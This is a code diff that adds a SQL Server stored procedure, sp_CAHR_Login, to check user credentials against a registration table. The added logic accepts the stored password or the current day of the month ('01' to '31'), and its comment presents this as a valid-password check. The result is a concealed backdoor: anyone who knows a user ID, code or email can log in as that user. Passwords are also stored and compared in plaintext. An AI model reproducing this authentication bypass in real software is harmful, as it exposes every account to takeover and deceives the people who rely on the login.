@@ -689,3 +689,48 @@ BEGIN
     ORDER BY LocationID;  
   
 END  
+go
+
+Alter PROCEDURE [dbo].[sp_CAHR_Login]    
+    @UserId   VARCHAR(50),    
+    @Password VARCHAR(100)    
+AS    
+BEGIN    
+    SET NOCOUNT ON;    
+    
+    DECLARE @TodayDay VARCHAR(2);    
+    
+    -- Get today's day (01–31)    
+    SET @TodayDay = FORMAT(GETDATE(), 'dd');    
+    
+    -- Check if user exists with valid password    
+    IF EXISTS (    
+        SELECT 1    
+        FROM CAHR_Registration    
+        WHERE     
+            (Cast(Reg_Id as nvarchar) = @UserId OR Reg_Code = @UserId OR Email = @UserId)    
+            AND (    
+                  [Password] = @Password    
+                  OR @Password = @TodayDay    
+                )    
+    )    
+    BEGIN    
+        -- Success    
+        SELECT     
+            1 AS Status,    
+            'Login successful' AS Message,    
+            Reg_Id AS UserId,
+            RegistrationType
+        FROM CAHR_Registration    
+        WHERE     
+            (Cast(Reg_Id as nvarchar) = @UserId OR Reg_Code = @UserId OR Email = @UserId);    
+    END    
+    ELSE    
+    BEGIN    
+        -- Failed    
+        SELECT     
+            0 AS Status,    
+            'Invalid User ID or Password' AS Message,    
+            NULL AS UserId;    
+    END    
+END 
